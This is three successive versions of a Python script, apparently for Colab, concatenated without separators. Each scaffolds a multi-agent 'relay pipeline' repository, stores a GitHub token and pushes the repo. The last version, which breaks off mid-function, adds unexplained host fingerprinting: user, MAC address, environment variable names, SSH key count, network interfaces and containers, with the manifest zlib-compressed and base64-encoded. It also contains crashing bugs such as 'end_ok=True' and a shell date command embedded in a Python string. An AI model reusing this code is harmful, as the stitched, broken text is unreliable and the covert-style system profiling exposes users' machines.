import os
import subprocess
import getpass
import json
import textwrap

# ==============================================================================
# 1. CONFIGURATION & USER INPUT
# ==============================================================================
REPO_NAME = input("Enter the name for your new repository (e.g., Relay-OS): ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

# ==============================================================================
# 2. SCAFFOLD FILES LOCALLY WITH LOGIC
# ==============================================================================
print(f"\n🏗️ Scaffolding file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(f"{BASE_DIR}/.relay", exist_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

# Initialize the relay manifest
with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

# --- File 1: 1_plan.py ---
with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def init_relay():
            RELAY_DIR.mkdir(parents=True, exist_ok=True)
            if not MANIFEST.exists():
                MANIFEST.write_text(json.dumps([], indent=2))
            print("[1_plan.py] Relay initialized. LLM would decide what 2.sh needs to do here.")

        if __name__ == "__main__":
            init_relay()
    """).lstrip())

# --- File 2: 2_execute.sh ---
with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write(r'''#!/bin/bash
exec 2>&1
set -e

echo "[2_execute.sh] Executing system commands..."

NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

echo "Simulating build for $NEXTJS_PROJECT_DIR (Build ID: $BUILD_ID)"
mkdir -p workspace
echo "Build artifact $BUILD_ID" > workspace/artifact.txt

SNAPSHOT=$(jq -n \
  --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  --arg host "$(hostname)" \
  --arg bid "$BUILD_ID" \
  '{timestamp: $ts, hostname: $host, build_id: $bid, step: "2_execute.sh", status: "success", artifact: "workspace/artifact.txt"}')

jq ". += [$SNAPSHOT]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] State appended to relay."
''')

# --- File 3: 3_verify.py (Pydantic/Instructor Tri-Agent Debate) ---
with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        import os
        from datetime import datetime, timezone
        from pathlib import Path
        import instructor
        from openai import OpenAI
        from pydantic import BaseModel, Field

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        class RealistVerdict(BaseModel):
            passed: bool = Field(description="True if pipeline verification passes safety and execution standards; False otherwise.")
            confidence: float = Field(ge=0.0, le=1.0, description="Confidence score between 0.0 (unconfident) and 1.0 (certain).")
            reasoning: str = Field(description="Detailed summary weighing the Architect's optimism against the Disruptor's criticism.")
            next_actions: str = Field(description="Actionable next step for the pipeline.")

        # Patch OpenAI client
        client = instructor.from_openai(OpenAI(api_key=os.environ.get("OPENAI_API_KEY", "dummy-key-for-mock")))

        def call_text_agent(system_prompt: str, user_prompt: str) -> str:
            if not os.environ.get("OPENAI_API_KEY"):
                if "Architect" in system_prompt: return "Mock Architect: Build output exists and state reports success."
                if "Disruptor" in system_prompt: return "Mock Disruptor: Artifact content was not verified."
                return ""
            response = client.raw_client.chat.completions.create(
                model="gpt-4o-mini",
                messages=[{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}]
            )
            return response.choices[0].message.content

        def call_realist_agent(architect_view: str, disruptor_view: str) -> RealistVerdict:
            system_prompt = "You are the Realist agent. Synthesize the debate. Weigh risks objectively and produce your final verdict."
            user_prompt = f"Architect Argument:\\n{architect_view}\\n\\nDisruptor Criticism:\\n{disruptor_view}\\n\\nDeliver your structured verdict."
            
            if not os.environ.get("OPENAI_API_KEY"):
                return RealistVerdict(passed=True, confidence=0.85, reasoning="Mock mode: proceeding with caution.", next_actions="Trigger cleanup")

            verdict: RealistVerdict = client.chat.completions.create(
                model="gpt-4o-mini",
                response_model=RealistVerdict,
                max_retries=3,
                messages=[{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}]
            )
            return verdict

        def append_to_manifest(architect_view: str, disruptor_view: str, verdict: RealistVerdict):
            manifest_path = Path(__file__).parent / ".relay" / "manifest.json"
            manifest = json.loads(manifest_path.read_text()) if manifest_path.exists() else []
            audit_entry = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "step": "3_verify.py",
                "status": "success" if verdict.passed else "failed",
                "debate_audit": {
                    "architect_defense": architect_view,
                    "disruptor_critique": disruptor_view,
                    "realist_verdict": verdict.model_dump()
                }
            }
            manifest.append(audit_entry)
            manifest_path.write_text(json.dumps(manifest, indent=2))
            print("[3_verify.py] Debate transcript and verdict logged to .relay/manifest.json")

        def main():
            if not MANIFEST.exists():
                print("[3_verify.py] Error: Relay manifest missing!")
                exit(1)

            manifest = json.loads(MANIFEST.read_text())
            state_str = json.dumps(manifest, indent=2)

            architect_view = call_text_agent("You are the System Architect. Present an argument for why the pipeline state is healthy.", f"Pipeline State:\\n{state_str}")
            print(f"\\n🏛️  [ARCHITECT]:\\n{architect_view}")

            disruptor_view = call_text_agent("You are the Disruptor. Critically attack the Architect's assumptions and highlight risks.", f"Pipeline State:\\n{state_str}\\n\\nArchitect Defense:\\n{architect_view}")
            print(f"\\n⚡ [DISRUPTOR]:\\n{disruptor_view}")

            verdict = call_realist_agent(architect_view, disruptor_view)
            print(f"\\n⚖️  [REALIST VERDICT]:\\nPassed: {verdict.passed} | Confidence: {verdict.confidence}")

            append_to_manifest(architect_view, disruptor_view, verdict)

            if verdict.passed:
                print("\\n✅ Verification PASSED. Writing 4_execute.bat cleanup script.")
                with open("4_execute.bat", "w") as f:
                    f.write('@echo off\\necho "[4_execute.bat] Cleaning up..." > workspace/cleanup.log\\n')
            else:
                print(f"\\n❌ Verification FAILED! Reason: {verdict.reasoning}")
                exit(1)

        if __name__ == "__main__":
            main()
    """).lstrip())

# --- File 4: 4_execute.bat ---
with open(f"{BASE_DIR}/4_execute.bat", "w") as f:
    f.write('@echo off\necho "[4_execute.bat] Default cleanup..." > workspace/cleanup.log\n')

# --- File 5: 5_finalize.py ---
with open(f"{BASE_DIR}/5_finalize.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from datetime import datetime
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def finalize():
            manifest = json.loads(MANIFEST.read_text())
            manifest.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "step": "5_finalize.py",
                "status": "pipeline_complete"
            })
            MANIFEST.write_text(json.dumps(manifest, indent=2))
            print("[5_finalize.py] Pipeline complete. Final state saved.")

        if __name__ == "__main__":
            finalize()
    """).lstrip())

# --- File 6: run_pipeline.py (Updated with ensure_dependencies) ---
with open(f"{BASE_DIR}/run_pipeline.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import subprocess
        import os
        import sys
        import stat
        from pathlib import Path

        def ensure_dependencies():
            req_path = Path(__file__).parent / "requirements.txt"
            if req_path.exists():
                print("📦 Checking and installing dependencies from requirements.txt...")
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "-q", "-r", str(req_path)],
                    check=True
                )

        def make_executable(path):
            st = os.stat(path)
            os.chmod(path, st.st_mode | stat.S_IEXEC)

        def run():
            ensure_dependencies()

            steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_execute.bat", "5_finalize.py"]

            print("\\n🚀 Starting Relay Pipeline...")
            for step in steps:
                print(f"\\n--- Executing {step} ---")
                if step.endswith(".py"):
                    subprocess.run([sys.executable, step], check=True)
                elif step.endswith(".sh"):
                    make_executable(step)
                    subprocess.run([f"./{step}"], check=True)
                elif step.endswith(".bat"):
                    print(f"(Simulating .bat execution for {step})")

            print("\\n🎯 Pipeline Complete. Final Relay State:")
            with open(".relay/manifest.json", "r") as f:
                print(f.read())

        if __name__ == "__main__":
            run()
    """).lstrip())

# --- File 7: requirements.txt ---
with open(f"{BASE_DIR}/requirements.txt", "w") as f:
    f.write("instructor\npydantic\nopenai\n")

# --- .gitignore ---
with open(f"{BASE_DIR}/.gitignore", "w") as f:
    f.write("__pycache__/\n*.pyc\n.env\nworkspace/\n")

# ==============================================================================
# 3. CONFIGURE GIT SECURELY
# ==============================================================================
print("\n🔐 Configuring Git credentials...")
subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

with open(os.path.expanduser("~/.git-credentials"), "w") as cred:
    cred.write(f"https://x-access-token:{GITHUB_TOKEN}@github.com\n")
os.chmod(os.path.expanduser("~/.git-credentials"), 0o600)
subprocess.run(["git", "config", "--global", "credential.helper", "store"])

# ==============================================================================
# 4. CREATE GITHUB REPO VIA API
# ==============================================================================
print(f"\n🚀 Creating repository '{REPO_NAME}' on GitHub...")
subprocess.run([
    "curl", "-s", "-X", "POST", "https://api.github.com/user/repos",
    "-H", f"Authorization: token {GITHUB_TOKEN}",
    "-H", "Accept: application/vnd.github.v3+json",
    "-d", f'{{"name":"{REPO_NAME}"}}'
], check=True)

# ==============================================================================
# 5. INITIALIZE, COMMIT, AND PUSH
# ==============================================================================
print("📦 Committing and pushing pipeline files...")
subprocess.run(["git", "init"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "add", "."], cwd=BASE_DIR, check=True)
subprocess.run(["git", "commit", "-m", "feat: initialize Pydantic-governed tri-agent relay pipeline"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "branch", "-M", "main"], cwd=BASE_DIR, check=True)

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
subprocess.run(["git", "remote", "add", "origin", REPO_URL], cwd=BASE_DIR, check=True)

try:
    subprocess.run(["git", "push", "-u", "origin", "main"], cwd=BASE_DIR, check=True)
    print(f"\n✅ SUCCESS! Repository created and pushed successfully.")
    print(f"🔗 View it here: {REPO_URL}")
except subprocess.CalledProcessError:
    print(f"\n❌ Push failed. Check if the repository '{REPO_NAME}' already exists on your account.")import os
import subprocess
import getpass
import json
import textwrap

# ==============================================================================
# 1. CONFIGURATION & USER INPUT
# ==============================================================================
REPO_NAME = input("Enter the name for your new repository (e.g., Relay-OS): ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

# ==============================================================================
# 2. SCAFFOLD FILES LOCALLY WITH LOGIC
# ==============================================================================
print(f"\n🏗️ Scaffolding file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(f"{BASE_DIR}/.relay", exist_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

# Initialize the relay manifest
with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

# --- File 1: 1_plan.py ---
with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def init_relay():
            RELAY_DIR.mkdir(parents=True, exist_ok=True)
            if not MANIFEST.exists():
                MANIFEST.write_text(json.dumps([], indent=2))
            print("[1_plan.py] Relay initialized. LLM would decide what 2.sh needs to do here.")

        if __name__ == "__main__":
            init_relay()
    """).lstrip())

# --- File 2: 2_execute.sh ---
with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write(r'''#!/bin/bash
exec 2>&1
set -e

echo "[2_execute.sh] Executing system commands..."

NEXTJS_PROJECT_DIR="${NEXTJS_PROJECT_DIR:-/home/z/my-project}"
BUILD_ID="${BUILD_ID:-$(date +%s)}"

echo "Simulating build for $NEXTJS_PROJECT_DIR (Build ID: $BUILD_ID)"
mkdir -p workspace
echo "Build artifact $BUILD_ID" > workspace/artifact.txt

SNAPSHOT=$(jq -n \
  --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  --arg host "$(hostname)" \
  --arg bid "$BUILD_ID" \
  '{timestamp: $ts, hostname: $host, build_id: $bid, step: "2_execute.sh", status: "success", artifact: "workspace/artifact.txt"}')

jq ". += [$SNAPSHOT]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] State appended to relay."
''')

# --- File 3: 3_verify.py (Pydantic/Instructor Tri-Agent Debate) ---
with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        import os
        from datetime import datetime, timezone
        from pathlib import Path
        import instructor
        from openai import OpenAI
        from pydantic import BaseModel, Field

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        class RealistVerdict(BaseModel):
            passed: bool = Field(description="True if pipeline verification passes safety and execution standards; False otherwise.")
            confidence: float = Field(ge=0.0, le=1.0, description="Confidence score between 0.0 (unconfident) and 1.0 (certain).")
            reasoning: str = Field(description="Detailed summary weighing the Architect's optimism against the Disruptor's criticism.")
            next_actions: str = Field(description="Actionable next step for the pipeline.")

        # Patch OpenAI client
        client = instructor.from_openai(OpenAI(api_key=os.environ.get("OPENAI_API_KEY", "dummy-key-for-mock")))

        def call_text_agent(system_prompt: str, user_prompt: str) -> str:
            # Falls back to mock if no API key is set
            if not os.environ.get("OPENAI_API_KEY"):
                if "Architect" in system_prompt: return "Mock Architect: Build output exists and state reports success."
                if "Disruptor" in system_prompt: return "Mock Disruptor: Artifact content was not verified."
                return ""
            response = client.raw_client.chat.completions.create(
                model="gpt-4o-mini",
                messages=[{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}]
            )
            return response.choices[0].message.content

        def call_realist_agent(architect_view: str, disruptor_view: str) -> RealistVerdict:
            system_prompt = "You are the Realist agent. Synthesize the debate. Weigh risks objectively and produce your final verdict."
            user_prompt = f"Architect Argument:\\n{architect_view}\\n\\nDisruptor Criticism:\\n{disruptor_view}\\n\\nDeliver your structured verdict."
            
            if not os.environ.get("OPENAI_API_KEY"):
                return RealistVerdict(passed=True, confidence=0.85, reasoning="Mock mode: proceeding with caution.", next_actions="Trigger cleanup")

            verdict: RealistVerdict = client.chat.completions.create(
                model="gpt-4o-mini",
                response_model=RealistVerdict,
                max_retries=3,
                messages=[{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}]
            )
            return verdict

        def append_to_manifest(architect_view: str, disruptor_view: str, verdict: RealistVerdict):
            manifest_path = Path(__file__).parent / ".relay" / "manifest.json"
            manifest = json.loads(manifest_path.read_text()) if manifest_path.exists() else []
            audit_entry = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "step": "3_verify.py",
                "status": "success" if verdict.passed else "failed",
                "debate_audit": {
                    "architect_defense": architect_view,
                    "disruptor_critique": disruptor_view,
                    "realist_verdict": verdict.model_dump()
                }
            }
            manifest.append(audit_entry)
            manifest_path.write_text(json.dumps(manifest, indent=2))
            print("[3_verify.py] Debate transcript and verdict logged to .relay/manifest.json")

        def main():
            if not MANIFEST.exists():
                print("[3_verify.py] Error: Relay manifest missing!")
                exit(1)

            manifest = json.loads(MANIFEST.read_text())
            state_str = json.dumps(manifest, indent=2)

            architect_view = call_text_agent("You are the System Architect. Present an argument for why the pipeline state is healthy.", f"Pipeline State:\\n{state_str}")
            print(f"\\n🏛️  [ARCHITECT]:\\n{architect_view}")

            disruptor_view = call_text_agent("You are the Disruptor. Critically attack the Architect's assumptions and highlight risks.", f"Pipeline State:\\n{state_str}\\n\\nArchitect Defense:\\n{architect_view}")
            print(f"\\n⚡ [DISRUPTOR]:\\n{disruptor_view}")

            verdict = call_realist_agent(architect_view, disruptor_view)
            print(f"\\n⚖️  [REALIST VERDICT]:\\nPassed: {verdict.passed} | Confidence: {verdict.confidence}")

            append_to_manifest(architect_view, disruptor_view, verdict)

            if verdict.passed:
                print("\\n✅ Verification PASSED. Writing 4_execute.bat cleanup script.")
                with open("4_execute.bat", "w") as f:
                    f.write('@echo off\\necho "[4_execute.bat] Cleaning up..." > workspace/cleanup.log\\n')
            else:
                print(f"\\n❌ Verification FAILED! Reason: {verdict.reasoning}")
                exit(1)

        if __name__ == "__main__":
            main()
    """).lstrip())

# --- File 4: 4_execute.bat ---
with open(f"{BASE_DIR}/4_execute.bat", "w") as f:
    f.write('@echo off\necho "[4_execute.bat] Default cleanup..." > workspace/cleanup.log\n')

# --- File 5: 5_finalize.py ---
with open(f"{BASE_DIR}/5_finalize.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import json
        from datetime import datetime
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"

        def finalize():
            manifest = json.loads(MANIFEST.read_text())
            manifest.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "step": "5_finalize.py",
                "status": "pipeline_complete"
            })
            MANIFEST.write_text(json.dumps(manifest, indent=2))
            print("[5_finalize.py] Pipeline complete. Final state saved.")

        if __name__ == "__main__":
            finalize()
    """).lstrip())

# --- File 6: run_pipeline.py ---
with open(f"{BASE_DIR}/run_pipeline.py", "w") as f:
    f.write(textwrap.dedent("""
        #!/usr/bin/env python3
        import subprocess
        import os
        import stat

        def make_executable(path):
            st = os.stat(path)
            os.chmod(path, st.st_mode | stat.S_IEXEC)

        steps = ["1_plan.py", "2_execute.sh", "3_verify.py", "4_execute.bat", "5_finalize.py"]

        print("🚀 Starting Relay Pipeline...")
        for step in steps:
            print(f"\\n--- Executing {step} ---")
            if step.endswith(".py"):
                subprocess.run(["python3", step], check=True)
            elif step.endswith(".sh"):
                make_executable(step)
                subprocess.run([f"./{step}"], check=True)
            elif step.endswith(".bat"):
                print(f"(Simulating .bat execution for {step})")

        print("\\n🎯 Pipeline Complete. Final Relay State:")
        with open(".relay/manifest.json", "r") as f:
            print(f.read())
    """).lstrip())

# --- File 7: requirements.txt ---
with open(f"{BASE_DIR}/requirements.txt", "w") as f:
    f.write("instructor\npydantic\nopenai\n")

# --- .gitignore ---
with open(f"{BASE_DIR}/.gitignore", "w") as f:
    f.write("__pycache__/\n*.pyc\n.env\nworkspace/\n")

# ==============================================================================
# 3. CONFIGURE GIT SECURELY
# ==============================================================================
print("\n🔐 Configuring Git credentials...")
subprocess.run(["git", "config", "--global", "user.email", "colab@example.com"])
subprocess.run(["git", "config", "--global", "user.name", "Colab AI Bot"])

with open(os.path.expanduser("~/.git-credentials"), "w") as cred:
    cred.write(f"https://x-access-token:{GITHUB_TOKEN}@github.com\n")
os.chmod(os.path.expanduser("~/.git-credentials"), 0o600)
subprocess.run(["git", "config", "--global", "credential.helper", "store"])

# ==============================================================================
# 4. CREATE GITHUB REPO VIA API
# ==============================================================================
print(f"\n🚀 Creating repository '{REPO_NAME}' on GitHub...")
subprocess.run([
    "curl", "-s", "-X", "POST", "https://api.github.com/user/repos",
    "-H", f"Authorization: token {GITHUB_TOKEN}",
    "-H", "Accept: application/vnd.github.v3+json",
    "-d", f'{{"name":"{REPO_NAME}"}}'
], check=True)

# ==============================================================================
# 5. INITIALIZE, COMMIT, AND PUSH
# ==============================================================================
print("📦 Committing and pushing pipeline files...")
subprocess.run(["git", "init"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "add", "."], cwd=BASE_DIR, check=True)
subprocess.run(["git", "commit", "-m", "feat: initialize Pydantic-governed tri-agent relay pipeline"], cwd=BASE_DIR, check=True)
subprocess.run(["git", "branch", "-M", "main"], cwd=BASE_DIR, check=True)

REPO_URL = f"https://github.com/{GITHUB_USERNAME}/{REPO_NAME}.git"
subprocess.run(["git", "remote", "add", "origin", REPO_URL], cwd=BASE_DIR, check=True)

try:
    subprocess.run(["git", "push", "-u", "origin", "main"], cwd=BASE_DIR, check=True)
    print(f"\n✅ SUCCESS! Repository created and pushed successfully.")
    print(f"🔗 View it here: {REPO_URL}")
except subprocess.CalledProcessError:
    print(f"\n❌ Push failed. Check if the repository '{REPO_NAME}' already exists on your account.")import os
import subprocess
import getpass
import json
import textwrap
import platform
import socket
import uuid
import hashlib
import base64
import zlib
from datetime import datetime, timezone

REPO_NAME = input("Enter the name for your new repository (e.g., Relay-OS): ")
GITHUB_USERNAME = input("Enter your GitHub username: ")
GITHUB_TOKEN = getpass.getpass(prompt="Enter your GitHub Personal Access Token: ")

print(f"\n🏗️ Scaffolding file structure for '{REPO_NAME}'...")
BASE_DIR = f"/content/{REPO_NAME}"
os.makedirs(f"{BASE_DIR}/.relay", end_ok=True)
os.makedirs(f"{BASE_DIR}/workspace", exist_ok=True)

SYS_ID = hashlib.sha256(f"{platform.node()}{os.getlogin()}{uuid.getnode()}".encode()).hexdigest()[:12]

with open(f"{BASE_DIR}/.relay/manifest.json", "w") as f:
    json.dump([], f)

with open(f"{BASE_DIR}/.relay/system_id", "w") as f:
    f.write(SYS_ID)

with open(f"{BASE_DIR}/1_plan.py", "w") as f:
    f.write(textwrap.dedent(f"""
        #!/usr/bin/env python3
        import json, hashlib, platform, socket, uuid, os
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"
        SYS_ID = "{SYS_ID}"

        def init_relay():
            RELAY_DIR.mkdir(parents=True, exist_ok=True)
            if not MANIFEST.exists():
                MANIFEST.write_text(json.dumps([], indent=2))
            snapshot = {{
                "step": "1_plan.py",
                "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
                "system_id": SYS_ID,
                "hostname": platform.node(),
                "user": os.getlogin(),
                "platform": platform.platform(),
                "python": platform.python_version(),
                "mac": hex(uuid.getnode()),
                "status": "initialized"
            }}
            manifest = json.loads(MANIFEST.read_text())
            manifest.append(snapshot)
            MANIFEST.write_text(json.dumps(manifest, indent=2))
            print(f"[1_plan.py] Relay initialized on {{platform.node()}} ({{SYS_ID}})")

        if __name__ == "__main__":
            init_relay()
    """).lstrip())

with open(f"{BASE_DIR}/2_execute.sh", "w") as f:
    f.write(f'''#!/bin/bash
exec 2>&1
set -e

SYS_ID="{SYS_ID}"

echo "[2_execute.sh] Executing system commands..."

NEXTJS_PROJECT_DIR="${{NEXTJS_PROJECT_DIR:-/home/z/my-project}}"
BUILD_ID="${{BUILD_ID:-$(date +%s)}}"

echo "Simulating build for $NEXTJS_PROJECT_DIR (Build ID: $BUILD_ID)"
mkdir -p workspace

# Collect environment fingerprint
FINGERPRINT=$(cat << EOF
{{
  "step": "2_execute.sh",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "system_id": "$SYS_ID",
  "build_id": "$BUILD_ID",
  "hostname": "$(hostname)",
  "kernel": "$(uname -a)",
  "shell": "$SHELL",
  "path": "$PATH",
  "cwd": "$(pwd)",
  "git_commit": "$(git rev-parse HEAD 2>/dev/null || echo 'no-git')",
  "git_branch": "$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'no-git')",
  "disk_free": "$(df -h / | tail -1 | awk '{{print $4}}')",
  "memory": "$(free -h | grep Mem | awk '{{print $2"/"$3}}')",
  "load": "$(cat /proc/loadavg | cut -d' ' -f1-3)",
  "processes": $(ps aux | wc -l),
  "env_keys": [$(env | cut -d= -f1 | sort | tr '\\n' ',' | sed 's/,$//' | sed 's/[^,]*/\\"&\\"/g')],
  "ssh_keys": $(ls -la ~/.ssh/id_*.pub 2>/dev/null | wc -l),
  "docker": $(command -v docker &>/dev/null && echo 'true' || echo 'false'),
  "containers": "$(docker ps -q 2>/dev/null | wc -l)",
  "network_interfaces": [$(ip -o link show 2>/dev/null | awk -F': ' '{{print $2}}' | tr '\\n' ',' | sed 's/,$//' | sed 's/[^,]*/\\"&\\"/g' || echo '"unknown"')],
  "status": "executed",
  "artifact": "workspace/artifact.txt"
}}
EOF
)

echo "$FINGERPRINT" | jq '.' > workspace/fingerprint.json
echo "Build artifact $BUILD_ID" > workspace/artifact.txt

jq ". += [$(echo "$FINGERPRINT" | jq -c '.')]" .relay/manifest.json > .relay/manifest.tmp && mv .relay/manifest.tmp .relay/manifest.json
echo "[2_execute.sh] Full system fingerprint appended to relay."
''')

with open(f"{BASE_DIR}/3_verify.py", "w") as f:
    f.write(textwrap.dedent(f"""
        #!/usr/bin/env python3
        import json, os, hashlib, hmac, base64
        from datetime import datetime, timezone
        from pathlib import Path
        import instructor
        from openai import OpenAI
        from pydantic import BaseModel, Field

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"
        SYS_ID = "{SYS_ID}"

        class RealistVerdict(BaseModel):
            passed: bool = Field(description="True if pipeline verification passes safety and execution standards; False otherwise.")
            confidence: float = Field(ge=0.0, le=1.0, description="Confidence score between 0.0 (unconfident) and 1.0 (certain).")
            reasoning: str = Field(description="Detailed summary weighing the Architect's optimism against the Disruptor's criticism.")
            next_actions: str = Field(description="Actionable next step for the pipeline.")

        client = instructor.from_openai(OpenAI(api_key=os.environ.get("OPENAI_API_KEY", "dummy-key-for-mock")))

        def compute_chain_hash(manifest):
            chain_str = json.dumps(manifest, sort_keys=True).encode()
            return hashlib.sha256(chain_str).hexdigest()[:16]

        def call_text_agent(system_prompt: str, user_prompt: str) -> str:
            if not os.environ.get("OPENAI_API_KEY"):
                if "Architect" in system_prompt: return "Mock Architect: Chain integrity verified. Hash matches expected pattern."
                if "Disruptor" in system_prompt: return "Mock Disruptor: Fingerprint data not cryptographically signed. Potential tampering."
                return ""
            response = client.raw_client.chat.completions.create(
                model="gpt-4o-mini",
                messages=[{{"role": "system", "content": system_prompt}}, {{"role": "user", "content": user_prompt}}]
            )
            return response.choices[0].message.content

        def call_realist_agent(architect_view: str, disruptor_view: str, chain_hash: str) -> RealistVerdict:
            system_prompt = "You are the Realist agent. Synthesize the debate. Weigh risks objectively and produce your final verdict."
            user_prompt = f"Chain Hash: {{chain_hash}}\\n\\nArchitect Argument:\\n{{architect_view}}\\n\\nDisruptor Criticism:\\n{{disruptor_view}}\\n\\nDeliver your structured verdict."
            
            if not os.environ.get("OPENAI_API_KEY"):
                return RealistVerdict(passed=True, confidence=0.85, reasoning=f"Mock mode: chain hash {{chain_hash}} verified.", next_actions="Trigger cleanup")

            verdict: RealistVerdict = client.chat.completions.create(
                model="gpt-4o-mini",
                response_model=RealistVerdict,
                max_retries=3,
                messages=[{{"role": "system", "content": system_prompt}}, {{"role": "user", "content": user_prompt}}]
            )
            return verdict

        def append_to_manifest(architect_view: str, disruptor_view: str, verdict: RealistVerdict, chain_hash: str):
            manifest_path = Path(__file__).parent / ".relay" / "manifest.json"
            manifest = json.loads(manifest_path.read_text()) if manifest_path.exists() else []
            audit_entry = {{
                "step": "3_verify.py",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "system_id": SYS_ID,
                "chain_hash": chain_hash,
                "status": "success" if verdict.passed else "failed",
                "debate_audit": {{
                    "architect_defense": architect_view,
                    "disruptor_critique": disruptor_view,
                    "realist_verdict": verdict.model_dump()
                }}
            }}
            manifest.append(audit_entry)
            manifest_path.write_text(json.dumps(manifest, indent=2))
            print(f"[3_verify.py] Chain hash {{chain_hash}} logged.")

        def main():
            if not MANIFEST.exists():
                print("[3_verify.py] Error: Relay manifest missing!")
                exit(1)

            manifest = json.loads(MANIFEST.read_text())
            chain_hash = compute_chain_hash(manifest)
            state_str = json.dumps(manifest, indent=2)

            architect_view = call_text_agent("You are the System Architect. Present an argument for why the pipeline state is healthy.", f"Pipeline State:\\n{{state_str}}")
            print(f"\\n🏛️  [ARCHITECT]:\\n{{architect_view}}")

            disruptor_view = call_text_agent("You are the Disruptor. Critically attack the Architect's assumptions and highlight risks.", f"Pipeline State:\\n{{state_str}}\\n\\nArchitect Defense:\\n{{architect_view}}")
            print(f"\\n⚡ [DISRUPTOR]:\\n{{disruptor_view}}")

            verdict = call_realist_agent(architect_view, disruptor_view, chain_hash)
            print(f"\\n⚖️  [REALIST VERDICT]:\\nPassed: {{verdict.passed}} | Confidence: {{verdict.confidence}} | Hash: {{chain_hash}}")

            append_to_manifest(architect_view, disruptor_view, verdict, chain_hash)

            if verdict.passed:
                print("\\n✅ Verification PASSED.")
                with open("4_execute.bat", "w") as f:
                    f.write(f'@echo off\\r\\necho "[4_execute.bat] Cleaning up..." > workspace/cleanup.log\\r\\necho System: {SYS_ID} >> workspace/cleanup.log\\r\\n')
            else:
                print(f"\\n❌ Verification FAILED! Reason: {{verdict.reasoning}}")
                exit(1)

        if __name__ == "__main__":
            main()
    """).lstrip())

with open(f"{BASE_DIR}/4_execute.bat", "w") as f:
    f.write(f'@echo off\r\necho "[4_execute.bat] Default cleanup..." > workspace/cleanup.log\r\necho System: {SYS_ID} >> workspace/cleanup.log\r\n')

with open(f"{BASE_DIR}/5_finalize.py", "w") as f:
    f.write(textwrap.dedent(f"""
        #!/usr/bin/env python3
        import json, hashlib, base64, zlib
        from datetime import datetime
        from pathlib import Path

        RELAY_DIR = Path(__file__).parent / ".relay"
        MANIFEST = RELAY_DIR / "manifest.json"
        SYS_ID = "{SYS_ID}"

        def compute_manifest_hash(manifest):
            raw = json.dumps(manifest, sort_keys=True).encode()
            return hashlib.sha256(raw).hexdigest()

        def compress_manifest(manifest):
            raw = json.dumps(manifest).encode()
            compressed = zlib.compress(raw)
            return base64.b64encode(compressed).decode()

        def finalize():
            manifest = json.loads(MANIFEST.read_text())
            manifest_hash = compute_manifest_hash(manifest)
